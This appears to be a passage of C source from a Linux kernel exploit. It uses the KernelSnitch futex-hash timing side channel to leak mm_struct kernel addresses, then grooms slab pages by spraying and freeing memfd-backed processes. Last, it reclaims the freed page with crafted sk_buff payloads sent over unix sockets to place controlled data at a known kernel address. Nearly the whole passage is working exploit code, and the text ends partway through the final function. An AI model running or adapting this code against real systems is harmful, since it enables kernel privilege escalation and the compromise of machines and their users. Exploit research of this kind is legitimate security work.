#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

#if defined(CONTROLLED_MM_GROUP_RECLAIM) && CONTROLLED_MM_GROUP_RECLAIM

enum controlled_mm_zone {
  CONTROLLED_MM_INVALID,
  CONTROLLED_MM_DMA32,
  CONTROLLED_MM_NORMAL,
};

static pid_t clone_controlled_leak_child(
    struct kernelsnitch_shared_state *state) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(2);
    }
    kernelsnitch_find_collisions(state);
    _exit(kernelsnitch_found_collisions(state) ? 0 : 4);
  }
  return child;
}

static enum controlled_mm_zone controlled_mm_zone_of(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);

  if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END) {
    return CONTROLLED_MM_DMA32;
  }
  if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END) {
    return CONTROLLED_MM_NORMAL;
  }
  return CONTROLLED_MM_INVALID;
}

static __attribute__((unused)) const char *controlled_mm_zone_name(
    enum controlled_mm_zone zone) {
  switch (zone) {
    case CONTROLLED_MM_DMA32:
      return "DMA32";
    case CONTROLLED_MM_NORMAL:
      return "NORMAL";
    default:
      return "INVALID";
  }
}

static int controlled_mm_valid(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
  uintptr_t offset = mm - base;

  return controlled_mm_zone_of(mm) != CONTROLLED_MM_INVALID &&
         offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
}

static uintptr_t controlled_mm_match_page(
    const struct kernelsnitch_shared_state *state, uintptr_t base) {
  uintptr_t found = (uintptr_t)-1;
  size_t count = 0;

  for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
       candidate += MM_STRUCT_SZ) {
    size_t hash = futex_hash(state->futex_addrs[0], candidate);
    size_t matches = 1;

    for (size_t i = 1; i < state->collisions; ++i) {
      matches += hash == futex_hash(state->futex_addrs[i], candidate);
    }
    if (matches == state->collisions) {
      found = candidate;
      count++;
    }
  }
  return count == 1 ? found : (uintptr_t)-1;
}

static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
                              uintptr_t *mm_out, int *hint_hit) {
  uintptr_t current_hint = hint;
  size_t collisions = hint ? KSNITCH_HINT_COLLISIONS
                           : KSNITCH_FULL_COLLISIONS;
  size_t passes = hint ? 2 : 1;

  *hint_hit = 0;
  for (size_t pass = 0; pass < passes; ++pass) {
    struct kernelsnitch_shared_state *state = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
    pid_t child;
    int fd;
    int status;

    if (!state) {
      return -1;
    }
    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
    child = clone_controlled_leak_child(state);
    fd = open_memfd(child);
    int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
                   !WEXITSTATUS(status) &&
                   kernelsnitch_found_collisions(state);
    if (!child_ok) {
      close(fd);
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      if (current_hint) {
        current_hint = 0;
        collisions = KSNITCH_FULL_COLLISIONS;
        continue;
      }
      return -2;
    }
    if (current_hint) {
      state->mm_struct = controlled_mm_match_page(state, current_hint);
      if (state->mm_struct == (uintptr_t)-1) {
        close(fd);
        state->state = KERNELSNITCH_MM_NOT_FOUND;
        kernelsnitch_cleanup(state);
        current_hint = 0;
        collisions = KSNITCH_FULL_COLLISIONS;
        continue;
      }
      state->found = 1;
      state->state = KERNELSNITCH_MM_FOUND;
      *hint_hit = 1;
    } else {
      kernelsnitch_bruteforce(state);
    }
    if (state->mm_struct == (uintptr_t)-1) {
      close(fd);
      kernelsnitch_cleanup(state);
      return -2;
    }
    *mm_out = state->mm_struct;
    kernelsnitch_cleanup(state);
    return fd;
  }
  return -2;
}

struct controlled_mm_drain_state {
  int *triggers;
  size_t trigger_count;
  int s2;
};

static void release_controlled_mm_drain(
    struct controlled_mm_drain_state *state) {
  size_t closed __attribute__((unused)) = 0;

  pin_to_core(CORE);
  for (size_t i = 0; i < state->trigger_count; ++i) {
    if (state->triggers[i] < 0) {
      continue;
    }
    SYSCHK(close(state->triggers[i]));
    state->triggers[i] = -1;
    closed++;
  }
  if (state->s2 >= 0) {
    SYSCHK(close(state->s2));
    state->s2 = -1;
    closed++;
  }
  free(state->triggers);
  state->triggers = NULL;
  state->trigger_count = 0;
  #ifdef DEBUG
  pr_info("controlled mm trigger release closed=%zu cpu=%d\n",
          closed, sched_getcpu());
#endif
}

static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
                                       int *chosen_fds) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t max_groups = 64;
  const size_t opaque_capacity = PAGE_SCAN_MAX * batch;
  uintptr_t *bases = calloc(max_groups, sizeof(*bases));
  size_t *counts = calloc(max_groups, sizeof(*counts));
  int *fds = malloc(max_groups * batch * sizeof(*fds));
  unsigned char *seen = calloc(max_groups * batch, sizeof(*seen));
  int *opaque = malloc(opaque_capacity * sizeof(*opaque));
  size_t opaque_count = 0;
  size_t group_count = 0;
  size_t chosen = max_groups;
  uintptr_t hint = 0;
  unsigned long chosen_attempt __attribute__((unused)) = 0;
  int result = 0;

  if (!bases || !counts || !fds || !seen || !opaque) {
    SYSCHK(-1);
  }
  for (size_t i = 0; i < max_groups * batch; ++i) {
    fds[i] = -1;
  }
  for (size_t i = 0; i < batch; ++i) {
    chosen_fds[i] = -1;
  }
  pr_info("finding mm collisions\n");
#ifdef DEBUG
  pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
          PAGE_SCAN_MAX, batch, DMA32_SKIP_SLABS);
#endif

  for (unsigned long attempt = 1;
       attempt <= PAGE_SCAN_MAX && !result; ++attempt) {
    uintptr_t mm = 0;
    uintptr_t base;
    size_t slot;
    size_t group = max_groups;
    int hint_hit;
    int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);

    if (fd == -2) {
      continue;
    }
    if (fd < 0) {
      break;
    }
    if (!controlled_mm_valid(mm)) {
      SYSCHK(close(fd));
      continue;
    }
    base = mm & ~(ORDER3_SIZE - 1);
    slot = (mm - base) / MM_STRUCT_SZ;
    if (controlled_mm_zone_of(base) == CONTROLLED_MM_DMA32) {
      size_t refs = DMA32_SKIP_SLABS * batch;

      if (opaque_count + refs > opaque_capacity) {
        SYSCHK(close(fd));
        break;
      }
      opaque[opaque_count++] = fd;
      pin_to_core(CORE);
      for (size_t i = 1; i < refs; ++i) {
        opaque[opaque_count++] = clone_memfd();
      }
      #ifdef DEBUG
      pr_info("controlled mm dma32 skip attempt=%lu base=%016zx refs=%zu total=%zu\n",
              attempt, base, refs, opaque_count);
#endif
      hint = 0;
      continue;
    }
    hint = base;
    for (size_t i = 0; i < group_count; ++i) {
      if (bases[i] == base) {
        group = i;
        break;
      }
    }
    if (group == max_groups && group_count < max_groups) {
      group = group_count++;
      bases[group] = base;
      #ifdef DEBUG
      pr_info("controlled mm group opened attempt=%lu group=%zu "
              "base=%016zx hint=%d\n",
              attempt, group, base, hint_hit);
#endif
    }
    if (group == max_groups || slot >= batch) {
      SYSCHK(close(fd));
      continue;
    }
    if (seen[group * batch + slot]) {
      SYSCHK(close(fd));
      hint = base;
      #ifdef DEBUG
      pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
              "base=%016zx slot=%zu\n",
              attempt, group, base, slot);
#endif
      continue;
    }
    seen[group * batch + slot] = 1;
    fds[group * batch + slot] = fd;
    counts[group]++;
    if (counts[group] == 1 || counts[group] % 8 == 0 ||
        counts[group] + 1 >= batch) {
      #ifdef DEBUG
      pr_info("controlled mm group attempt=%lu group=%zu base=%016zx slot=%zu count=%zu hint=%d\n",
              attempt, group, base, slot, counts[group], hint_hit);
#endif
    }
    if (counts[group] == batch) {
      chosen = group;
      chosen_attempt = attempt;
      *base_out = base;
      result = 1;
    }
  }

  pin_to_core(CORE);
  for (size_t group = 0; group < group_count; ++group) {
    for (size_t slot = 0; slot < batch; ++slot) {
      int fd = fds[group * batch + slot];

      if (fd < 0) {
        continue;
      }
      if (result && group == chosen) {
        chosen_fds[slot] = fd;
        continue;
      }
      SYSCHK(close(fd));
    }
  }
  for (size_t i = 0; i < opaque_count; ++i) {
    SYSCHK(close(opaque[i]));
  }
  if (result) {
#ifdef DEBUG
    pr_info("controlled mm group full group=%zu base=%016zx attempts=%lu zone=%s\n",
            chosen, *base_out, chosen_attempt,
            controlled_mm_zone_name(controlled_mm_zone_of(*base_out)));
#endif
  } else {
    pr_warning("finding usable page failed groups=%zu scans=%d\n",
               group_count, PAGE_SCAN_MAX);
  }
  free(opaque);
  free(seen);
  free(fds);
  free(counts);
  return result;
}

static int drain_controlled_mm_group(
    int *target_fds, struct controlled_mm_drain_state *state,
    int shaping_sv[2]) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t trigger_refs = TRIGGER_SLABS * batch;

  state->triggers = malloc(trigger_refs * sizeof(*state->triggers));
  state->trigger_count = trigger_refs;
  state->s2 = -1;
  if (!state->triggers) {
    errno = ENOMEM;
    SYSCHK(-1);
  }
  pin_to_core(CORE);
  for (size_t i = 0; i < trigger_refs; ++i) {
    state->triggers[i] = clone_memfd();
  }
  state->s2 = clone_memfd();
  #ifdef DEBUG
  pr_info("controlled mm trigger ready pages=%d refs=%zu s2=%d cpu=%d\n",
          TRIGGER_SLABS, trigger_refs, state->s2, sched_getcpu());
#endif
  for (size_t i = 0; i + 1 < batch; ++i) {
    SYSCHK(close(target_fds[i]));
    target_fds[i] = -1;
  }
  for (size_t page = 0; page < TRIGGER_SLABS; ++page) {
    size_t index = page * batch;
    SYSCHK(close(state->triggers[index]));
    state->triggers[index] = -1;
  }
  #ifdef DEBUG
  pr_info("controlled mm target tail armed pages=%d refs_held=%zu shape=ready cpu=%d\n",
          TRIGGER_SLABS,
          trigger_refs - TRIGGER_SLABS + 1, sched_getcpu());
#endif
  SYSCHK(fflush(NULL));
  SYSCHK(close(shaping_sv[0]));
  shaping_sv[0] = -1;
  SYSCHK(close(shaping_sv[1]));
  shaping_sv[1] = -1;
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(target_fds[batch - 1]));
  target_fds[batch - 1] = -1;
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int *target_fds;
  int shaping_sv[2] = {-1, -1};
  uintptr_t base = 0;
  int sndbuf = SKB_SNDBUF;
  struct iovec iov;
  struct msghdr msg;
  struct controlled_mm_drain_state drain_state = {
      .s2 = -1,
  };

  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  skb_buf = malloc(SKB_SEND_SIZE);
  target_fds = calloc(mm_objs_per_slab, sizeof(*target_fds));
  if (!skb_buf || !target_fds) {
    errno = ENOMEM;
    SYSCHK(-1);
  }

  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
    free(target_fds);
    return 0;
  }
  #ifdef DEBUG
  pr_info("controlled mm group selected base=%016zx mode=%d\n",
          base, payload_mode);
#endif
  if (!prepare_skb_payload(base, payload_mode)) {
    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
      if (target_fds[i] >= 0) {
        SYSCHK(close(target_fds[i]));
      }
    }
    free(target_fds);
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  SYSCHK(setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
                    &sndbuf, sizeof(sndbuf)));
  int flags = SYSCHK(fcntl(reclaim_sv[0], F_GETFL, 0));
  SYSCHK(fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK));
  for (size_t pair = 0; pair + 1 < RECLAIM_SOCKET_PAIRS; ++pair) {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0,
                      controlled_reclaim_sv[pair]));
    controlled_reclaim_count++;
    SYSCHK(setsockopt(controlled_reclaim_sv[pair][0], SOL_SOCKET,
                      SO_SNDBUF, &sndbuf, sizeof(sndbuf)));
    flags = SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_GETFL, 0));
    SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_SETFL,
                 flags | O_NONBLOCK));
  }

  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, shaping_sv));
  ssize_t shaped = sendmsg(shaping_sv[0], &msg, 0);
  if (shaped != (ssize_t)SKB_SEND_SIZE) {
    if (shaped >= 0) {
      errno = EIO;
    }
    SYSCHK(-1);
  }
  pr_info("controlled skb shape sent bytes=%zd cpu=%d\n",
          shaped, sched_getcpu());

  if (!drain_controlled_mm_group(target_fds, &drain_state, shaping_sv)) {
    free(target_fds);
    return 0;
  }

  int sent_count = 0;
  int stop_errno = 0;
  for (size_t pair = 0; pair < RECLAIM_SOCKET_PAIRS; ++pair) {
    int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
    for (int send_index = 0; send_index < SKB_SENDS; ++send_index) {
      errno = 0;
      ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
      if (sent != (ssize_t)SKB_SEND_SIZE) {
        stop_errno = errno;
        break;
      }
      sent_count++;
    }
  }
  release_controlled_mm_drain(&drain_state);
  free(target_fds);
  pr_info("controlled skb reclaim sends=%d pairs=%d per_pair=%d stop_errno=%d base=%016zx mode=%d\n",
          sent_count, RECLAIM_SOCKET_PAIRS, SKB_SENDS,
          stop_errno, base, payload_mode);
  return sent_count ? base : 0;
}

#else

#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
static void cleanup_failed_kernel_page(const char *reason) {
  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
  kernelsnitch_cleanup(ks);
  ks = NULL;
  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
          reason, prepare_ctx.mm_cnt);
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    kill_child(prepare_ctx.childs[i]);
  }
  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
  cleanup_page_prepare_state();
}
#endif

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  cleanup_page_prepare_state();
#endif
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
  }
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
#if defined(KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
    defined(KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
  size_t search_min_object_index = FOPS_MIN_OBJECT_INDEX;
  size_t search_max_object_index = mm_objs_per_slab - 1;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    search_min_object_index = SLIDE_MIN_OBJECT_INDEX;
    search_max_object_index = SLIDE_MAX_OBJECT_INDEX;
  }
  kernelsnitch_set_search_bounds(
      ks, KERNELSNITCH_IDENTITY_START,
      KERNEL_PAGE_KSNITCH_IDENTITY_END,
      search_min_object_index, search_max_object_index,
      KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
#endif
  configure_kernelsnitch_profile(ks, payload_mode);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    kernelsnitch_set_profile(
        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
        SLIDE_KSNITCH_AVERAGE);
  }
#endif
#endif

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  log_mm_slabinfo("after-child-exit");
#endif

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("collision");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("mm-leak");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  leaked = canonicalize_kernelsnitch_pointer(leaked);
  log_mm_slabinfo("after-leak");
#endif

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, object_index);
#if defined(RECLAIM_MAX_DIRECT_BASE)
  if (base >= RECLAIM_MAX_DIRECT_BASE) {
    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
               payload_mode, base,
               (unsigned long long)RECLAIM_MAX_DIRECT_BASE);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(SLIDE_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index < SLIDE_MIN_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
               object_index, SLIDE_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(SLIDE_MAX_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
      object_index > SLIDE_MAX_OBJECT_INDEX) {
    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
               object_index, SLIDE_MAX_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#if defined(FOPS_MIN_OBJECT_INDEX)
  if (payload_mode == PAGE_PAYLOAD_FOPS &&
      object_index < FOPS_MIN_OBJECT_INDEX) {
    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
               object_index, FOPS_MIN_OBJECT_INDEX);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }
#endif
#else
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ);
#endif
  if (!prepare_skb_payload(base, payload_mode)) {
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("skb-payload");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#ifdef SLIDE_RECLAIM_SNDBUF
  int sndbuf = SLIDE_RECLAIM_SNDBUF;
#else
  int sndbuf = 1 << 20;
#endif
  errno = 0;
  int sndbuf_set_ret =
      setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf));
  int sndbuf_set_errno = errno;
  socklen_t sndbuf_len = sizeof(sndbuf);
  int sndbuf_effective = 0;
  errno = 0;
  int sndbuf_get_ret =
      getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf_effective,
                 &sndbuf_len);
  int sndbuf_get_errno = errno;
  pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
          "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
          sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
          sndbuf_get_ret, sndbuf_get_errno);
#else
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
#endif
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
#if defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW
  SYSCHK(fflush(NULL));
#endif

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  SYSCHK(close(pre_ctx.memfds[target_pre]));
  pre_ctx.memfds[target_pre] = -1;
  SYSCHK(close(post_ctx.memfds[0]));
  post_ctx.memfds[0] = -1;
#if !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
  pr_info("mm target-neighbor slab queued for late drain\n");
#endif
  for (size_t i = 0; i < target_pre; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION && \
    !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
  log_mm_slabinfo("after-target-neighbors");
#endif

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#ifdef MM_LATE_DRAIN_TRIGGERS
  drain_triggers = MM_LATE_DRAIN_TRIGGERS;
#endif
  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
  size_t deferred_reap_count = 0;
  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
#endif
  for (size_t i = 0; i < drain_triggers; i++) {
    size_t index = i * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
#if (defined(DEFER_ALL_DRAIN_REAPS) && \
     DEFER_ALL_DRAIN_REAPS) || \
    (defined(DEFER_FINAL_DRAIN_REAP) && \
     DEFER_FINAL_DRAIN_REAP)
    int defer_reap = 0;
#if defined(DEFER_ALL_DRAIN_REAPS) && DEFER_ALL_DRAIN_REAPS
    defer_reap = 1;
#elif defined(DEFER_FINAL_DRAIN_REAP) && DEFER_FINAL_DRAIN_REAP
    defer_reap = i + 1 == drain_triggers;
#endif
    if (defer_reap) {
      pid_t child = prepare_ctx.childs[index];
      SYSCHK(kill(child, SIGKILL));
      siginfo_t child_info;
      memset(&child_info, 0, sizeof(child_info));
      int wait_ret;
      do {
        wait_ret = waitid(P_PID, child, &child_info,
                          WEXITED | WNOWAIT);
      } while (wait_ret < 0 && errno == EINTR);
      SYSCHK(wait_ret);
      deferred_reap_children[deferred_reap_count++] = child;
      prepare_ctx.childs[index] = -1;
#if !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
              "code=%d status=%d\n",
              i + 1, drain_triggers, child, child_info.si_code,
              child_info.si_status);
#endif
      continue;
    }
#endif
#endif
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if !defined(REQUIRE_FRESH_P0_SESSION) || !REQUIRE_FRESH_P0_SESSION
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
#endif
  int reclaim_sends = SKB_RECLAIM_SENDS;
#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
  reclaim_sends = SLIDE_RECLAIM_SENDS;
#endif
  int reclaim_sent = 0;
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  int reclaim_errno = 0;
#endif
  for (int i = 0; i < reclaim_sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
      reclaim_errno = errno;
#endif
      break;
    }
    reclaim_sent++;
  }
#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
  for (size_t i = 0; i < deferred_reap_count; i++) {
    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
            i + 1, deferred_reap_count, deferred_reap_children[i]);
  }
#if defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW
  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
          deferred_reap_count);
#endif
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
          reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
  log_mm_slabinfo("after-exact-drain-reclaim");
#else
  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
          reclaim_sent, reclaim_sends, payload_mode);
#endif
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
          payload_mode, base);
#endif
  kernelsnitch_cleanup(ks);
  ks = NULL;
